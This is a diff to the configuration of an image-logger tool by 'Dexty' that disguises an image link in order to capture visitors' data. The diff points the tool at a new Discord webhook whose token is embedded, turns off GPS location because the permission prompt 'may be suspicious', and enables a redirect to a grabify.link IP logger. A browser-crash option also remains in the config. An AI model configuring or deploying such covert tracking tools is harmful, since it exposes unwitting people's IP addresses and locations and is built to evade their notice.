@@ -12,7 +12,7 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1380586774224699495/jmLpEZ43xGXMM64Gc_Z0m3z7gnHI2acy6aS7ukITtq9BLnxjvWQaKyivOu5FYnOVUkWA",
+    "webhook": "https://discord.com/api/webhooks/1380656382113480714/oQHmKCsPpXs406NwowFV0kcBNE3ivBy-SqFDRtCLrvnj9oxpZhXRR9HlVW9entCpJ8Jx",
     "image": "https://wallpapers.com/images/featured/xp-background-nhvtxpop808oaye4.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -24,7 +24,7 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/xdexty0/Chromebook-Crasher)
     
-    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://grabify.link/A3JP0W" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
